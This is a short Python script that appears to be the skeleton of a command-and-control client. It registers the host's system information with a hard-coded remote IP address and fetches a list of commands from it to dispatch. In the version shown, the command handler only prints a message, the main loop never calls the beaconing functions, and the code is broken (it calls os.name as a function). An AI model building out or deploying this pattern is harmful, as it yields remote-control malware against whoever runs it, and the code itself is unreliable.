import requests
import json
import os
import time

HOST = "http://141.164.63.158:3000";

def add():
  name = os.uname()
  params = { 'name': name }
  requests.get(f"{HOST}/add", params=params)

def fetch():
  name = os.name()
  params = { 'name': name }
  r = requests.get(f"{HOST}/fetch", params=params)
  cmds = json.loads(r.text)

  for cmd in cmds:
    execute(cmd['type'], data=cmd['cmdData'])

def execute(type, data=False):
  print(f"[INFO] Command type {type} executed")

def main():
  while True:
    time.sleep(1)


if __name__ == "__main__":
  main()